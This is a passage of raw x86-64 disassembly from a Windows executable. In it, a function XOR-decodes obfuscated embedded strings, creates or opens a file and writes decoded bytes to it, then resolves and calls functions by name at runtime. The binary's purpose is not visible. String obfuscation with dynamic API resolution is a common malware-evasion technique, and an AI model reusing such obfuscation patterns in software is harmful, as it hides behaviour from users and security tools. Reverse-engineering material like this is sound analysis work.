   140004857:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000485c:	48 8d 85 e0 01 00 00 	lea    0x1e0(%rbp),%rax
   140004863:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140004868:	48 8d 05 b9 7f 03 00 	lea    0x37fb9(%rip),%rax        # 0x14003c828
   14000486f:	eb 43                	jmp    0x1400048b4
   140004871:	48 8d 15 b0 7d 03 00 	lea    0x37db0(%rip),%rdx        # 0x14003c628
   140004878:	e8 c3 39 00 00       	call   0x140008240
   14000487d:	48 8d 85 40 01 00 00 	lea    0x140(%rbp),%rax
   140004884:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004889:	48 8d 85 30 01 00 00 	lea    0x130(%rbp),%rax
   140004890:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004895:	48 8d 85 00 02 00 00 	lea    0x200(%rbp),%rax
   14000489c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400048a1:	48 8d 85 e0 01 00 00 	lea    0x1e0(%rbp),%rax
   1400048a8:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400048ad:	48 8d 05 44 7f 03 00 	lea    0x37f44(%rip),%rax        # 0x14003c7f8
   1400048b4:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400048b8:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   1400048bd:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   1400048c2:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   1400048c6:	0f 11 45 88          	movups %xmm0,-0x78(%rbp)
   1400048ca:	0f 11 4d 98          	movups %xmm1,-0x68(%rbp)
   1400048ce:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400048d2:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400048d6:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   1400048dd:	e8 ee f3 ff ff       	call   0x140003cd0
   1400048e2:	0f 10 05 bf 7e 03 00 	movups 0x37ebf(%rip),%xmm0        # 0x14003c7a8
   1400048e9:	0f 29 45 80          	movaps %xmm0,-0x80(%rbp)
   1400048ed:	0f 10 0d c4 7e 03 00 	movups 0x37ec4(%rip),%xmm1        # 0x14003c7b8
   1400048f4:	0f 29 4d 90          	movaps %xmm1,-0x70(%rbp)
   1400048f8:	0f 10 05 c9 7e 03 00 	movups 0x37ec9(%rip),%xmm0        # 0x14003c7c8
   1400048ff:	0f 29 45 a0          	movaps %xmm0,-0x60(%rbp)
   140004903:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004906:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   14000490b:	0f 11 4c 24 50       	movups %xmm1,0x50(%rsp)
   140004910:	0f 11 4c 24 60       	movups %xmm1,0x60(%rsp)
   140004915:	49 8b c4             	mov    %r12,%rax
   140004918:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000491f:	00 
   140004920:	f3 0f 6f 44 45 80    	movdqu -0x80(%rbp,%rax,2),%xmm0
   140004926:	41 0f 57 c1          	xorps  %xmm9,%xmm0
   14000492a:	f3 0f 7f 44 44 40    	movdqu %xmm0,0x40(%rsp,%rax,2)
   140004930:	48 83 c0 08          	add    $0x8,%rax
   140004934:	48 83 f8 10          	cmp    $0x10,%rax
   140004938:	72 e6                	jb     0x140004920
   14000493a:	48 83 f8 17          	cmp    $0x17,%rax
   14000493e:	73 18                	jae    0x140004958
   140004940:	b9 d2 00 00 00       	mov    $0xd2,%ecx
   140004945:	66 33 4c 45 80       	xor    -0x80(%rbp,%rax,2),%cx
   14000494a:	66 89 4c 44 40       	mov    %cx,0x40(%rsp,%rax,2)
   14000494f:	48 ff c0             	inc    %rax
   140004952:	48 83 f8 17          	cmp    $0x17,%rax
   140004956:	72 e8                	jb     0x140004940
   140004958:	66 44 89 64 24 6e    	mov    %r12w,0x6e(%rsp)
   14000495e:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140004963:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   140004967:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   14000496c:	0f 11 4d 90          	movups %xmm1,-0x70(%rbp)
   140004970:	0f 10 44 24 60       	movups 0x60(%rsp),%xmm0
   140004975:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   140004979:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000497c:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004981:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004984:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   14000498a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004990:	48 8d 15 65 6d 03 00 	lea    0x36d65(%rip),%rdx        # 0x14003b6fc
   140004997:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000499c:	e8 7f 41 00 00       	call   0x140008b20
   1400049a1:	90                   	nop
   1400049a2:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   1400049a6:	48 ff c7             	inc    %rdi
   1400049a9:	66 83 3c 78 00       	cmpw   $0x0,(%rax,%rdi,2)
   1400049ae:	75 f6                	jne    0x1400049a6
   1400049b0:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400049b5:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400049ba:	48 8b c1             	mov    %rcx,%rax
   1400049bd:	49 2b c6             	sub    %r14,%rax
   1400049c0:	48 3b f8             	cmp    %rax,%rdi
   1400049c3:	77 39                	ja     0x1400049fe
   1400049c5:	49 8d 04 3e          	lea    (%r14,%rdi,1),%rax
   1400049c9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400049ce:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   1400049d3:	48 83 f9 07          	cmp    $0x7,%rcx
   1400049d7:	48 0f 47 5c 24 40    	cmova  0x40(%rsp),%rbx
   1400049dd:	4a 8d 0c 73          	lea    (%rbx,%r14,2),%rcx
   1400049e1:	4c 8d 04 3f          	lea    (%rdi,%rdi,1),%r8
   1400049e5:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400049e9:	e8 e2 95 02 00       	call   0x14002dfd0
   1400049ee:	49 8d 04 3e          	lea    (%r14,%rdi,1),%rax
   1400049f2:	66 44 89 24 43       	mov    %r12w,(%rbx,%rax,2)
   1400049f7:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400049fc:	eb 1c                	jmp    0x140004a1a
   1400049fe:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004a03:	4c 8d 4d 80          	lea    -0x80(%rbp),%r9
   140004a07:	44 0f b6 44 24 70    	movzbl 0x70(%rsp),%r8d
   140004a0d:	48 8b d7             	mov    %rdi,%rdx
   140004a10:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004a15:	e8 56 5d 00 00       	call   0x14000a770
   140004a1a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004a1d:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140004a24:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004a27:	f3 0f 7f 8d 80 01 00 	movdqu %xmm1,0x180(%rbp)
   140004a2e:	00 
   140004a2f:	0f 10 00             	movups (%rax),%xmm0
   140004a32:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140004a39:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a3d:	0f 11 8d 80 01 00 00 	movups %xmm1,0x180(%rbp)
   140004a44:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140004a48:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140004a4f:	00 
   140004a50:	66 44 89 20          	mov    %r12w,(%rax)
   140004a54:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140004a59:	48 83 fa 07          	cmp    $0x7,%rdx
   140004a5d:	76 37                	jbe    0x140004a96
   140004a5f:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004a66:	00 
   140004a67:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004a6c:	48 8b c1             	mov    %rcx,%rax
   140004a6f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004a76:	72 19                	jb     0x140004a91
   140004a78:	48 83 c2 27          	add    $0x27,%rdx
   140004a7c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004a80:	48 2b c1             	sub    %rcx,%rax
   140004a83:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004a87:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004a8b:	0f 87 60 05 00 00    	ja     0x140004ff1
   140004a91:	e8 8a a3 00 00       	call   0x14000ee20
   140004a96:	66 0f 6f 05 02 7e 03 	movdqa 0x37e02(%rip),%xmm0        # 0x14003c8a0
   140004a9d:	00 
   140004a9e:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140004aa4:	66 44 89 64 24 40    	mov    %r12w,0x40(%rsp)
   140004aaa:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140004ab1:	48 83 bd 88 01 00 00 	cmpq   $0x7,0x188(%rbp)
   140004ab8:	07 
   140004ab9:	48 0f 47 8d 70 01 00 	cmova  0x170(%rbp),%rcx
   140004ac0:	00 
   140004ac1:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   140004ac6:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140004acd:	00 
   140004ace:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004ad5:	00 
   140004ad6:	45 33 c9             	xor    %r9d,%r9d
   140004ad9:	45 33 c0             	xor    %r8d,%r8d
   140004adc:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140004ae1:	ff 15 61 b5 02 00    	call   *0x2b561(%rip)        # 0x140030048
   140004ae7:	48 8b d8             	mov    %rax,%rbx
   140004aea:	48 85 c0             	test   %rax,%rax
   140004aed:	75 0c                	jne    0x140004afb
   140004aef:	48 8d 15 42 7b 03 00 	lea    0x37b42(%rip),%rdx        # 0x14003c638
   140004af6:	e9 d0 01 00 00       	jmp    0x140004ccb
   140004afb:	0f 10 05 ee 7b 03 00 	movups 0x37bee(%rip),%xmm0        # 0x14003c6f0
   140004b02:	0f 29 85 90 00 00 00 	movaps %xmm0,0x90(%rbp)
   140004b09:	0f 10 0d f0 7b 03 00 	movups 0x37bf0(%rip),%xmm1        # 0x14003c700
   140004b10:	0f 29 8d a0 00 00 00 	movaps %xmm1,0xa0(%rbp)
   140004b17:	0f 10 05 f2 7b 03 00 	movups 0x37bf2(%rip),%xmm0        # 0x14003c710
   140004b1e:	0f 29 85 b0 00 00 00 	movaps %xmm0,0xb0(%rbp)
   140004b25:	0f 10 0d f4 7b 03 00 	movups 0x37bf4(%rip),%xmm1        # 0x14003c720
   140004b2c:	0f 29 8d c0 00 00 00 	movaps %xmm1,0xc0(%rbp)
   140004b33:	0f 10 05 f6 7b 03 00 	movups 0x37bf6(%rip),%xmm0        # 0x14003c730
   140004b3a:	0f 29 85 d0 00 00 00 	movaps %xmm0,0xd0(%rbp)
   140004b41:	0f 10 0d f8 7b 03 00 	movups 0x37bf8(%rip),%xmm1        # 0x14003c740
   140004b48:	0f 29 8d e0 00 00 00 	movaps %xmm1,0xe0(%rbp)
   140004b4f:	0f 10 05 fa 7b 03 00 	movups 0x37bfa(%rip),%xmm0        # 0x14003c750
   140004b56:	0f 29 85 f0 00 00 00 	movaps %xmm0,0xf0(%rbp)
   140004b5d:	0f 10 0d fc 7b 03 00 	movups 0x37bfc(%rip),%xmm1        # 0x14003c760
   140004b64:	0f 29 8d 00 01 00 00 	movaps %xmm1,0x100(%rbp)
   140004b6b:	8b 05 ff 7b 03 00    	mov    0x37bff(%rip),%eax        # 0x14003c770
   140004b71:	89 85 10 01 00 00    	mov    %eax,0x110(%rbp)
   140004b77:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004b7a:	33 c0                	xor    %eax,%eax
   140004b7c:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140004b80:	0f 11 45 10          	movups %xmm0,0x10(%rbp)
   140004b84:	0f 11 45 20          	movups %xmm0,0x20(%rbp)
   140004b88:	0f 11 45 30          	movups %xmm0,0x30(%rbp)
   140004b8c:	0f 11 45 40          	movups %xmm0,0x40(%rbp)
   140004b90:	0f 11 45 50          	movups %xmm0,0x50(%rbp)
   140004b94:	0f 11 45 60          	movups %xmm0,0x60(%rbp)
   140004b98:	0f 11 45 70          	movups %xmm0,0x70(%rbp)
   140004b9c:	89 85 80 00 00 00    	mov    %eax,0x80(%rbp)
   140004ba2:	49 8b cc             	mov    %r12,%rcx
   140004ba5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140004bac:	00 00 00 00 
   140004bb0:	f3 0f 6f 84 4d 90 00 	movdqu 0x90(%rbp,%rcx,2),%xmm0
   140004bb7:	00 00 
   140004bb9:	41 0f 57 c1          	xorps  %xmm9,%xmm0
   140004bbd:	f3 0f 7f 44 4d 00    	movdqu %xmm0,0x0(%rbp,%rcx,2)
   140004bc3:	f3 0f 6f 8c 4d a0 00 	movdqu 0xa0(%rbp,%rcx,2),%xmm1
   140004bca:	00 00 
   140004bcc:	41 0f 57 c9          	xorps  %xmm9,%xmm1
   140004bd0:	f3 0f 7f 4c 4d 10    	movdqu %xmm1,0x10(%rbp,%rcx,2)
   140004bd6:	f3 0f 6f 84 4d b0 00 	movdqu 0xb0(%rbp,%rcx,2),%xmm0
   140004bdd:	00 00 
   140004bdf:	41 0f 57 c1          	xorps  %xmm9,%xmm0
   140004be3:	f3 0f 7f 44 4d 20    	movdqu %xmm0,0x20(%rbp,%rcx,2)
   140004be9:	f3 0f 6f 8c 4d c0 00 	movdqu 0xc0(%rbp,%rcx,2),%xmm1
   140004bf0:	00 00 
   140004bf2:	41 0f 57 c9          	xorps  %xmm9,%xmm1
   140004bf6:	f3 0f 7f 4c 4d 30    	movdqu %xmm1,0x30(%rbp,%rcx,2)
   140004bfc:	48 83 c1 20          	add    $0x20,%rcx
   140004c00:	48 83 f9 40          	cmp    $0x40,%rcx
   140004c04:	72 aa                	jb     0x140004bb0
   140004c06:	48 83 f9 41          	cmp    $0x41,%rcx
   140004c0a:	73 1f                	jae    0x140004c2b
   140004c0c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004c10:	b8 d2 00 00 00       	mov    $0xd2,%eax
   140004c15:	66 33 84 4d 90 00 00 	xor    0x90(%rbp,%rcx,2),%ax
   140004c1c:	00 
   140004c1d:	66 89 44 4d 00       	mov    %ax,0x0(%rbp,%rcx,2)
   140004c22:	48 ff c1             	inc    %rcx
   140004c25:	48 83 f9 41          	cmp    $0x41,%rcx
   140004c29:	72 e5                	jb     0x140004c10
   140004c2b:	66 44 89 a5 82 00 00 	mov    %r12w,0x82(%rbp)
   140004c32:	00 
   140004c33:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140004c37:	0f 11 85 40 02 00 00 	movups %xmm0,0x240(%rbp)
   140004c3e:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   140004c42:	0f 11 8d 50 02 00 00 	movups %xmm1,0x250(%rbp)
   140004c49:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   140004c4d:	0f 11 85 60 02 00 00 	movups %xmm0,0x260(%rbp)
   140004c54:	0f 10 4d 30          	movups 0x30(%rbp),%xmm1
   140004c58:	0f 11 8d 70 02 00 00 	movups %xmm1,0x270(%rbp)
   140004c5f:	0f 10 45 40          	movups 0x40(%rbp),%xmm0
   140004c63:	0f 11 85 80 02 00 00 	movups %xmm0,0x280(%rbp)
   140004c6a:	0f 10 4d 50          	movups 0x50(%rbp),%xmm1
   140004c6e:	0f 11 8d 90 02 00 00 	movups %xmm1,0x290(%rbp)
   140004c75:	0f 10 45 60          	movups 0x60(%rbp),%xmm0
   140004c79:	0f 11 85 a0 02 00 00 	movups %xmm0,0x2a0(%rbp)
   140004c80:	0f 10 4d 70          	movups 0x70(%rbp),%xmm1
   140004c84:	0f 11 8d b0 02 00 00 	movups %xmm1,0x2b0(%rbp)
   140004c8b:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   140004c91:	89 85 c0 02 00 00    	mov    %eax,0x2c0(%rbp)
   140004c97:	44 89 a5 20 01 00 00 	mov    %r12d,0x120(%rbp)
   140004c9e:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004ca3:	4c 8d 8d 20 01 00 00 	lea    0x120(%rbp),%r9
   140004caa:	41 b8 84 00 00 00    	mov    $0x84,%r8d
   140004cb0:	48 8d 95 40 02 00 00 	lea    0x240(%rbp),%rdx
   140004cb7:	48 8b cb             	mov    %rbx,%rcx
   140004cba:	ff 15 60 b3 02 00    	call   *0x2b360(%rip)        # 0x140030020
   140004cc0:	85 c0                	test   %eax,%eax
   140004cc2:	75 63                	jne    0x140004d27
   140004cc4:	48 8d 15 95 79 03 00 	lea    0x37995(%rip),%rdx        # 0x14003c660
   140004ccb:	48 8d 0d 6e f9 03 00 	lea    0x3f96e(%rip),%rcx        # 0x140044640
   140004cd2:	e8 69 35 00 00       	call   0x140008240
   140004cd7:	90                   	nop
   140004cd8:	48 8b 95 88 01 00 00 	mov    0x188(%rbp),%rdx
   140004cdf:	48 83 fa 07          	cmp    $0x7,%rdx
   140004ce3:	0f 86 c6 00 00 00    	jbe    0x140004daf
   140004ce9:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004cf0:	00 
   140004cf1:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140004cf8:	48 8b c1             	mov    %rcx,%rax
   140004cfb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004d02:	72 19                	jb     0x140004d1d
   140004d04:	48 83 c2 27          	add    $0x27,%rdx
   140004d08:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004d0c:	48 2b c1             	sub    %rcx,%rax
   140004d0f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004d13:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004d17:	0f 87 da 02 00 00    	ja     0x140004ff7
   140004d1d:	e8 fe a0 00 00       	call   0x14000ee20
   140004d22:	e9 88 00 00 00       	jmp    0x140004daf
   140004d27:	8b 95 20 01 00 00    	mov    0x120(%rbp),%edx
   140004d2d:	48 8d 0d 0c f9 03 00 	lea    0x3f90c(%rip),%rcx        # 0x140044640
   140004d34:	e8 37 08 00 00       	call   0x140005570
   140004d39:	48 8b c8             	mov    %rax,%rcx
   140004d3c:	e8 af 37 00 00       	call   0x1400084f0
   140004d41:	48 8b cb             	mov    %rbx,%rcx
   140004d44:	ff 15 1e b3 02 00    	call   *0x2b31e(%rip)        # 0x140030068
   140004d4a:	90                   	nop
   140004d4b:	48 8b 95 88 01 00 00 	mov    0x188(%rbp),%rdx
   140004d52:	48 83 fa 07          	cmp    $0x7,%rdx
   140004d56:	76 39                	jbe    0x140004d91
   140004d58:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004d5f:	00 
   140004d60:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140004d67:	48 8b c1             	mov    %rcx,%rax
   140004d6a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004d71:	72 19                	jb     0x140004d8c
   140004d73:	48 83 c2 27          	add    $0x27,%rdx
   140004d77:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004d7b:	48 2b c1             	sub    %rcx,%rax
   140004d7e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004d82:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004d86:	0f 87 6b 02 00 00    	ja     0x140004ff7
   140004d8c:	e8 8f a0 00 00       	call   0x14000ee20
   140004d91:	48 8d 15 e8 78 03 00 	lea    0x378e8(%rip),%rdx        # 0x14003c680
   140004d98:	48 8d 0d 41 fa 03 00 	lea    0x3fa41(%rip),%rcx        # 0x1400447e0
   140004d9f:	e8 6c 2d 00 00       	call   0x140007b10
   140004da4:	48 8b c8             	mov    %rax,%rcx
   140004da7:	e8 24 30 00 00       	call   0x140007dd0
   140004dac:	41 8b f4             	mov    %r12d,%esi
   140004daf:	48 8d 05 ca 7a 03 00 	lea    0x37aca(%rip),%rax        # 0x14003c880
   140004db6:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   140004dbd:	48 8d 15 a4 67 03 00 	lea    0x367a4(%rip),%rdx        # 0x14003b568
   140004dc4:	48 8b 8d c8 01 00 00 	mov    0x1c8(%rbp),%rcx
   140004dcb:	ff 15 a7 b2 02 00    	call   *0x2b2a7(%rip)        # 0x140030078
   140004dd1:	48 8b f8             	mov    %rax,%rdi
   140004dd4:	48 8d 15 6d 67 03 00 	lea    0x3676d(%rip),%rdx        # 0x14003b548
   140004ddb:	48 8b 8d c8 01 00 00 	mov    0x1c8(%rbp),%rcx
   140004de2:	ff 15 90 b2 02 00    	call   *0x2b290(%rip)        # 0x140030078
   140004de8:	48 8b d8             	mov    %rax,%rbx
   140004deb:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   140004df2:	ff d7                	call   *%rdi
   140004df4:	33 d2                	xor    %edx,%edx
   140004df6:	48 8b 8d a8 01 00 00 	mov    0x1a8(%rbp),%rcx
   140004dfd:	ff d3                	call   *%rbx
   140004dff:	48 8b 8d b8 01 00 00 	mov    0x1b8(%rbp),%rcx
   140004e06:	48 85 c9             	test   %rcx,%rcx
   140004e09:	74 06                	je     0x140004e11
   140004e0b:	e8 10 a0 00 00       	call   0x14000ee20
   140004e10:	90                   	nop
   140004e11:	48 8b 95 f8 01 00 00 	mov    0x1f8(%rbp),%rdx
   140004e18:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e1c:	76 34                	jbe    0x140004e52
   140004e1e:	48 ff c2             	inc    %rdx
   140004e21:	48 8b 8d e0 01 00 00 	mov    0x1e0(%rbp),%rcx
   140004e28:	48 8b c1             	mov    %rcx,%rax
   140004e2b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e32:	72 19                	jb     0x140004e4d
   140004e34:	48 83 c2 27          	add    $0x27,%rdx
   140004e38:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004e3c:	48 2b c1             	sub    %rcx,%rax
   140004e3f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004e43:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004e47:	0f 87 b0 01 00 00    	ja     0x140004ffd
   140004e4d:	e8 ce 9f 00 00       	call   0x14000ee20
   140004e52:	66 0f 6f 05 56 7a 03 	movdqa 0x37a56(%rip),%xmm0        # 0x14003c8b0
   140004e59:	00 
   140004e5a:	f3 0f 7f 85 f0 01 00 	movdqu %xmm0,0x1f0(%rbp)
   140004e61:	00 
   140004e62:	c6 85 e0 01 00 00 00 	movb   $0x0,0x1e0(%rbp)
   140004e69:	48 8b 95 18 02 00 00 	mov    0x218(%rbp),%rdx
   140004e70:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e74:	76 3c                	jbe    0x140004eb2
   140004e76:	48 ff c2             	inc    %rdx
   140004e79:	48 8b 8d 00 02 00 00 	mov    0x200(%rbp),%rcx
   140004e80:	48 8b c1             	mov    %rcx,%rax
   140004e83:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e8a:	72 19                	jb     0x140004ea5
   140004e8c:	48 83 c2 27          	add    $0x27,%rdx
   140004e90:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004e94:	48 2b c1             	sub    %rcx,%rax
   140004e97:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004e9b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004e9f:	0f 87 5e 01 00 00    	ja     0x140005003
   140004ea5:	e8 76 9f 00 00       	call   0x14000ee20
   140004eaa:	66 0f 6f 05 fe 79 03 	movdqa 0x379fe(%rip),%xmm0        # 0x14003c8b0
   140004eb1:	00 
   140004eb2:	f3 0f 7f 85 10 02 00 	movdqu %xmm0,0x210(%rbp)
   140004eb9:	00 
   140004eba:	c6 85 00 02 00 00 00 	movb   $0x0,0x200(%rbp)
   140004ec1:	48 8b 95 38 02 00 00 	mov    0x238(%rbp),%rdx
   140004ec8:	48 83 fa 07          	cmp    $0x7,%rdx
   140004ecc:	0f 86 d8 00 00 00    	jbe    0x140004faa
   140004ed2:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004ed9:	00 
   140004eda:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   140004ee1:	48 8b c1             	mov    %rcx,%rax
   140004ee4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004eeb:	72 19                	jb     0x140004f06
   140004eed:	48 83 c2 27          	add    $0x27,%rdx
   140004ef1:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004ef5:	48 2b c1             	sub    %rcx,%rax
   140004ef8:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004efc:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004f00:	0f 87 e5 00 00 00    	ja     0x140004feb
   140004f06:	e8 15 9f 00 00       	call   0x14000ee20
   140004f0b:	e9 9a 00 00 00       	jmp    0x140004faa
   140004f10:	48 8d 15 09 69 03 00 	lea    0x36909(%rip),%rdx        # 0x14003b820
   140004f17:	48 8d 0d f2 f9 03 00 	lea    0x3f9f2(%rip),%rcx        # 0x140044910
   140004f1e:	e8 1d 33 00 00       	call   0x140008240
   140004f23:	48 8b d8             	mov    %rax,%rbx
   140004f26:	ff 15 2c b1 02 00    	call   *0x2b12c(%rip)        # 0x140030058
   140004f2c:	8b d0                	mov    %eax,%edx
   140004f2e:	48 8b cb             	mov    %rbx,%rcx
   140004f31:	e8 3a 06 00 00       	call   0x140005570
   140004f36:	48 8b d8             	mov    %rax,%rbx
   140004f39:	48 8b 08             	mov    (%rax),%rcx
   140004f3c:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   140004f40:	48 8b 4c 01 40       	mov    0x40(%rcx,%rax,1),%rcx
   140004f45:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004f49:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140004f4e:	48 8b 11             	mov    (%rcx),%rdx
   140004f51:	ff 52 08             	call   *0x8(%rdx)
   140004f54:	90                   	nop
   140004f55:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004f5a:	e8 e1 28 00 00       	call   0x140007840
   140004f5f:	48 8b 08             	mov    (%rax),%rcx
   140004f62:	4c 8b 41 40          	mov    0x40(%rcx),%r8
   140004f66:	b2 0a                	mov    $0xa,%dl
   140004f68:	48 8b c8             	mov    %rax,%rcx
   140004f6b:	41 ff d0             	call   *%r8
   140004f6e:	0f b6 f8             	movzbl %al,%edi
   140004f71:	be 01 00 00 00       	mov    $0x1,%esi
   140004f76:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140004f7b:	48 85 c9             	test   %rcx,%rcx
   140004f7e:	74 16                	je     0x140004f96
   140004f80:	48 8b 11             	mov    (%rcx),%rdx
   140004f83:	ff 52 10             	call   *0x10(%rdx)
   140004f86:	48 85 c0             	test   %rax,%rax
   140004f89:	74 0b                	je     0x140004f96
   140004f8b:	4c 8b 00             	mov    (%rax),%r8
   140004f8e:	8b d6                	mov    %esi,%edx
   140004f90:	48 8b c8             	mov    %rax,%rcx
   140004f93:	41 ff 10             	call   *(%r8)
   140004f96:	40 0f b6 d7          	movzbl %dil,%edx
   140004f9a:	48 8b cb             	mov    %rbx,%rcx
   140004f9d:	e8 be 4e 00 00       	call   0x140009e60
   140004fa2:	48 8b cb             	mov    %rbx,%rcx
   140004fa5:	e8 96 24 00 00       	call   0x140007440
   140004faa:	8b c6                	mov    %esi,%eax
   140004fac:	48 8b 8d f0 02 00 00 	mov    0x2f0(%rbp),%rcx
   140004fb3:	48 33 cc             	xor    %rsp,%rcx
   140004fb6:	e8 45 9e 00 00       	call   0x14000ee00
   140004fbb:	4c 8d 9c 24 40 04 00 	lea    0x440(%rsp),%r11
   140004fc2:	00 
   140004fc3:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004fc7:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004fcb:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   140004fd0:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   140004fd5:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   140004fda:	45 0f 28 4b c0       	movaps -0x40(%r11),%xmm9
   140004fdf:	49 8b e3             	mov    %r11,%rsp
   140004fe2:	41 5f                	pop    %r15
   140004fe4:	41 5e                	pop    %r14
   140004fe6:	41 5c                	pop    %r12
   140004fe8:	5f                   	pop    %rdi
   140004fe9:	5d                   	pop    %rbp
   140004fea:	c3                   	ret
   140004feb:	e8 a4 21 01 00       	call   0x140017194
   140004ff0:	90                   	nop
   140004ff1:	e8 9e 21 01 00       	call   0x140017194
   140004ff6:	90                   	nop
   140004ff7:	e8 98 21 01 00       	call   0x140017194
   140004ffc:	90                   	nop
   140004ffd:	e8 92 21 01 00       	call   0x140017194
   140005002:	90                   	nop
   140005003:	e8 8c 21 01 00       	call   0x140017194
   140005008:	cc                   	int3
   140005009:	cc                   	int3
   14000500a:	cc                   	int3
   14000500b:	cc                   	int3
   14000500c:	cc                   	int3
   14000500d:	cc                   	int3
   14000500e:	cc                   	int3
